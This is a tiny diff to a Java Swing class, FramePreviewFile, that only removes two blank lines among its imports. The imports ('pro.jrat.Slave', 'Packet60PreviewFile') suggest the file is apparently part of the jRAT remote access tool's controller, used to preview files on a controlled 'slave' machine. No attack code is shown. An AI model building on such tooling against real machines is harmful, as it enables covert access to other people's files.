@@ -22,8 +22,6 @@ import javax.swing.border.EmptyBorder;
 import pro.jrat.Slave;
 import pro.jrat.packets.outgoing.Packet60PreviewFile;
 
-
-
 @SuppressWarnings("serial")
 public class FramePreviewFile extends BaseFrame {
 
